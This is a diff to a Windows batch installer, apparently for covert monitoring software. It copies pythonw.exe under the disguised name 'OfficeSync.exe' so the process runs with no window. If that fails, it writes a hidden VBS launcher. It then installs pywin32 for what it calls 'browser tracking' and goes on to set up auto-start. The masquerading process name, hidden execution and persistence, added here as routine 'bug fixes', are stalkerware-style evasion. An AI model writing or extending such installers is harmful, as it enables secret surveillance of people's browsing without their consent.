@@ -61,21 +61,61 @@ if %errorLevel% neq 0 (
 echo [4/5] Installing Python dependencies...
 cd /d "%INSTALL_DIR%"
 
-:: Copy pythonw.exe with disguised name
+:: FIX BUG #63: Find and copy pythonw.exe with disguised name (CRITICAL for no window)
+set PYTHONW_FOUND=0
 where pythonw.exe >nul 2>&1
 if %errorLevel% equ 0 (
     for /f "delims=" %%i in ('where pythonw.exe') do (
         copy "%%i" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
-        goto :found_python
+        if %errorLevel% equ 0 (
+            set PYTHONW_FOUND=1
+            echo     ✓ pythonw.exe copied as OfficeSync.exe
+            goto :found_python
+        )
     )
 )
+
+:: Fallback: Find pythonw.exe in Python installation directory
+if %PYTHONW_FOUND% equ 0 (
+    for /f "tokens=*" %%i in ('where python.exe 2^>nul') do (
+        set PYTHON_DIR=%%~dpi
+        if exist "!PYTHON_DIR!pythonw.exe" (
+            copy "!PYTHON_DIR!pythonw.exe" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
+            if %errorLevel% equ 0 (
+                set PYTHONW_FOUND=1
+                echo     ✓ pythonw.exe found and copied
+                goto :found_python
+            )
+        )
+    )
+)
+
+:: Last resort: Create VBS script to launch python without window
+if %PYTHONW_FOUND% equ 0 (
+    echo     ⚠ pythonw.exe not found, creating no-window launcher
+    echo Set WshShell = CreateObject("WScript.Shell") > "%INSTALL_DIR%\OfficeSync.vbs"
+    echo WshShell.Run """%INSTALL_DIR%\python_launcher.bat""", 0, False >> "%INSTALL_DIR%\OfficeSync.vbs"
+)
+
 :found_python
 
+echo     Installing dependencies...
 python -m pip install --quiet --upgrade pip
 python -m pip install --quiet -r requirements.txt
 if %errorLevel% neq 0 (
     echo [WARNING] Some dependencies failed to install
     echo The client will try to auto-install them on first run
+)
+
+:: FIX BUG #64: Explicitly install pywin32 for Windows browser tracking (CRITICAL)
+echo     Installing Windows-specific dependencies...
+python -m pip install --quiet pywin32>=306
+if %errorLevel% equ 0 (
+    echo     ✓ pywin32 installed (browser tracking support)
+    :: Post-install script for pywin32
+    python -m pywin32_postinstall -install >nul 2>&1
+) else (
+    echo     ⚠ pywin32 installation failed - browser tracking may not work
 )
 
 echo [5/5] Setting up auto-start...
